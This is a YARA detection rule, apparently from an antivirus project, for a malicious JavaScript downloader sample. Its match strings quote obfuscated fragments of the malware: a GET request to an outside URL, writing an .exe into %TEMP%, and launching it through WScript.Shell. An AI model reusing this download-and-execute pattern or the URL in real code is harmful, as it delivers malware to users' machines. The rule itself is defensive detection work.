rule sig_20160329_df93b23fd9516ecdf2b03d9c8719376d {
  meta:
    description = "datamaliciousorder - file 20160329_df93b23fd9516ecdf2b03d9c8719376d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "394cf9baa010610c9bf878482f2284eb557d7051059eed10d3861e0dd92d0cee"

  strings:
    $s1  = "function Nytlgz() {return Htgyvtrt[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"MihE2rV5HqLlY.exe\";};" fullword ascii
    $s2  = "Okzdxgij[Cvbsm](\"GET\", \"http://princesse-indienne.com/m6yaf\", false);" fullword ascii
    $s3  = "do {WScript[Bqaevygir](Gofofmxr() * 11)} while (Okzdxgij[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Htgyvtrt = function Amiqssssck() {return WScript[Sqyjdpr](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Yszjakc(Djxwe, Xbhvz){return Djxwe - Xbhvz;};" fullword ascii
    $s6  = "function Sgdhj() {return ((Mltwwihj == true) && (Mltwwihj == Zewbvmqoqi)) ? 1 : Phnvat;};" fullword ascii
    $s7  = "function Vqksop(Idjiweboz){Htgyvtrt[\"Run\"](Idjiweboz, Phnvat, Phnvat);};" fullword ascii
    $s8  = "Mltwwihj = true; " fullword ascii
    $s9  = "function Xzxxufb(Ciief) {var Xxhlyicfqi = (1, 2, 3, 4, 5, Ciief); return Xxhlyicfqi;};" fullword ascii
    $s10 = "function Gofofmxr(){return 22;};" fullword ascii
    $s11 = "function Gnwqa(){return Sqyjdpr;};" fullword ascii
    $s12 = "return Yszjakc(Uwxzcbolyk, Dcfzbhnjwm);" fullword ascii
    $s13 = "Zewbvmqoqi = true; " fullword ascii
    $s14 = " while (Mbdlum){" fullword ascii
    $s15 = "var Mltwwihj = false;" fullword ascii
    $s16 = "var Zewbvmqoqi = false;" fullword ascii
    $s17 = "function Qpprsxtz(){return Asifuh;};" fullword ascii
    $s18 = "function Vguawdqut()" fullword ascii
    $s19 = "var Ihlchhl = new this[\"Date\"]();" fullword ascii
    $s20 = "} catch(Mxuqq){Mbdlum = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}